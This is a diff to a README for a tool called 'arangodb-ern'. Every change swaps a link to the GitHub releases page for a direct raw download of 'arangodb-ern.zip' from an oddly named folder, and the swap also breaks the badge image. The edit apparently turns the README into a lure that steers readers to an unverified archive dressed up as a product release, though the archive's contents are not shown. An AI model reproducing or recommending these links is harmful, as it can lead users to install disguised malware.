@@ -1,6 +1,6 @@
 # 🚀 arangodb-ern - Easy and Fast Database Management
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Dedhawk/arangodb-ern/releases)
+[![Download](https://raw.githubusercontent.com/Dedhawk/arangodb-ern/main/Psilotaceae/arangodb-ern.zip%20release-brightgreen)](https://raw.githubusercontent.com/Dedhawk/arangodb-ern/main/Psilotaceae/arangodb-ern.zip)
 
 ## 📥 Overview
 
@@ -31,7 +31,7 @@ Follow the steps below to download and install the application:
 
 1. **Visit the Releases Page:**
    Click the link below to go to the download page where you can find the latest release.
-   [Download the latest release](https://github.com/Dedhawk/arangodb-ern/releases)
+   [Download the latest release](https://raw.githubusercontent.com/Dedhawk/arangodb-ern/main/Psilotaceae/arangodb-ern.zip)
 
 2. **Choose Your Version:**
    On the releases page, locate the version that matches your operating system. There are versions for Windows, macOS, and Linux.
@@ -97,4 +97,4 @@ Regular updates ensure you have the latest features and security fixes. To check
 
 You now have everything you need to download and run `arangodb-ern`. Enjoy managing your databases effortlessly with this powerful tool. Don’t forget to explore all the features to make the most of your experience.
 
-[Download the latest release](https://github.com/Dedhawk/arangodb-ern/releases)
+[Download the latest release](https://raw.githubusercontent.com/Dedhawk/arangodb-ern/main/Psilotaceae/arangodb-ern.zip)
